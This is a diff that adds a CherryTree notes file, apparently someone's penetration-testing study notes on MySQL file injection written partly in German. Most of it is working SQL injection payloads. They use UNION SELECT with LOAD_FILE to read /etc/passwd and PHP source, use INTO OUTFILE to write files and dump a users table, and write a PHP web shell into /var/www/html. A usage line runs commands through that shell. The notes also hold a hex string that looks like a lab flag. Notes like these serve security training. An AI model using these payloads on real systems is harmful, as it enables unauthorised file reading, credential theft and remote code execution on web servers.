@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="28" master_id="0" name="file injection" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747420178" ts_lastsave="1747437029">
+    <rich_text>File Injection:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Need 3 things to write files to db: 
+1. User with FILE privilege enabled&#13;
+2. MySQL global secure_file_priv variable not enabled&#13;
+3. Write access to the location we want to write to on the back-end server
+
+check for secure_file_priv:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+with union:
+
+if null -&gt; we can r/w everywhere.
+
+Schreiben in file:
+
+
+In union:
+
+
+webshell usen:
+
+immer shell.php?0=cat /etc/passwd
+
+528d6d9cedc2c7aab146ef226e918396</rich_text>
+    <table char_offset="16" justification="left" col_min="300" col_max="300" col_widths="0,0">
+      <row>
+        <cell>cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -</cell>
+        <cell>read current php file source code with ctr + u (prob not rendered right)</cell>
+      </row>
+      <row>
+        <cell>select 'file written successfully!' into outfile '/var/www/html/proof.txt'	sds</cell>
+        <cell>Write a string to a local file&#13;</cell>
+      </row>
+      <row>
+        <cell>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -	</cell>
+        <cell>Write a web shell into the base web directory&#13;</cell>
+      </row>
+      <row>
+        <cell>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</cell>
+        <cell>Read local file&#13;</cell>
+      </row>
+    </table>
+    <codebox char_offset="252" justification="left" frame_width="1642" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"</codebox>
+    <codebox char_offset="267" justification="left" frame_width="1921" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</codebox>
+    <codebox char_offset="323" justification="left" frame_width="746" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">SELECT * from users INTO OUTFILE '/tmp/credentials';</codebox>
+    <codebox char_offset="336" justification="left" frame_width="1320" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- </codebox>
+  </node>
+</cherrytree>
